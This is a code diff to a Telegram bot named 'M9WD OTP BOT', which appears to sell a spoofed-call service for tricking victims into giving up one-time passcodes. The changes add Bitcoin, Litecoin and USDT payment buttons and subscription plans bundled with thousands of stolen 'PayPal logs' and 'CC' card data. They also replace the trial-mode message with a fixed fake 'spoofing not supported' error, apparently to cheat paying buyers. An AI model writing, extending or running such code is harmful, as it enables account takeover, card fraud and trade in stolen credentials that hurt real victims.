@@ -132,7 +132,8 @@ async def start_message(message):
             ]
         ]
         )
-        await message.answer("""📲 M9WD OTP BOT
+        image = FSInputFile("img.jpg")
+        await message.answer_photo(image, caption="""📲 M9WD OTP BOT
 
 ❓ Here you can find frequently asked questions that we have compiled for you in an organized and user-friendly manner. They'll be updated as we go!
 
@@ -189,8 +190,15 @@ async def purchase(message: Message):
         keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="🔑 Premium", callback_data="premium"),
-                InlineKeyboardButton(text="🔑 Regular", callback_data="regular")
+                InlineKeyboardButton(text="📞 Support", url=admin_link)
+            ],
+            [
+                InlineKeyboardButton(text="LTC", callback_data="ltc"),
+                InlineKeyboardButton(text="USDT", callback_data="usdt")
+            ],
+            [
+                
+                InlineKeyboardButton(text="BTC", callback_data="btc")
             ],
             [
                 InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
@@ -198,7 +206,13 @@ async def purchase(message: Message):
         ]
         )
         await message.delete()
-        await message.answer("""💸 Choose your subscription type:""",reply_markup=keyboard)
+        await message.answer("""💬 Please select your desired plan.
+                                                                                                       
+  • 1 Day plan    ➜ 22$ + ( 60 PayPal logs + 5 CC gift )
+  • 2 Days plan   ➜ 35$ + ( 150 Paypal logs + 10 CC gift )
+  • 1 Week plan   ➜ 60$ + ( 1k Paypal logs + 30 CC gift )
+  • 1 Month plan  ➜ 135$ + ( 5k Paypal logs + 60 CC gift )
+  • 3 Months plan ➜ 600$ + ( 10k Paypal logs + 250 CC gift  )""",reply_markup=keyboard)
 
 
 #PROFILE
@@ -386,10 +400,8 @@ async def send_local_video(message: Message):
     🏦 SERVICE NAME : """+args[3]+"""
     ⚙️ OTP DIGITS: """+args[4])
                                 sleep(8)
-                                if not (get_user_info(user_id,'trial')): 
-                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
-                                else:
-                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
+                                await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
+                                
                             elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
                                 await message.answer("❌ You have to type a valid phone number.")
                             elif args[3] not in services:
@@ -424,10 +436,8 @@ async def prebuilt_commands(message: Message):
     📞 CALLER ID : 7800667788
     ⚙️ OTP DIGITS: """+args[2])
                                 sleep(8)
-                                if not (get_user_info(user_id,'trial')): 
-                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
-                                else:
-                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
+
+                                await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
                             elif not(victim.isdecimal() and 6<=len(victim)<=15):
                                 await message.answer("You have to type a valid phone number.")
                             elif not(args[4].isdecimal()):
@@ -459,7 +469,8 @@ async def restart_message(callback: CallbackQuery, bot: Bot):
         ]
         )
         await callback.message.delete()
-        await callback.message.answer("""📲 M9WD OTP BOT
+        image = FSInputFile("img.jpg")
+        await callback.message.answer(image,caption="""📲 M9WD OTP BOT
 
 ❓ Here you can find frequently asked questions that we have compiled for you in an organized and user-friendly manner. They'll be updated as we go!
 
@@ -569,11 +580,11 @@ async def pricing(callback: CallbackQuery, bot: Bot):
         await callback.message.delete()
         await callback.message.answer("""💬 Please select your desired plan.
                                                                                                        
-  • 1 Day plan    ➜ 22$
-  • 2 Days plan   ➜ 35$
-  • 1 Week plan   ➜ 60$
-  • 1 Month plan  ➜ 135$
-  • 3 Months plan ➜ 600$""",reply_markup=keyboard)
+  • 1 Day plan    ➜ 22$ + ( 60 PayPal logs + 5 CC gift )
+  • 2 Days plan   ➜ 35$ + ( 150 Paypal logs + 10 CC gift )
+  • 1 Week plan   ➜ 60$ + ( 1k Paypal logs + 30 CC gift )
+  • 1 Month plan  ➜ 135$ + ( 5k Paypal logs + 60 CC gift )
+  • 3 Months plan ➜ 600$ + ( 10k Paypal logs + 250 CC gift  )""",reply_markup=keyboard)
 
 
 #BTC
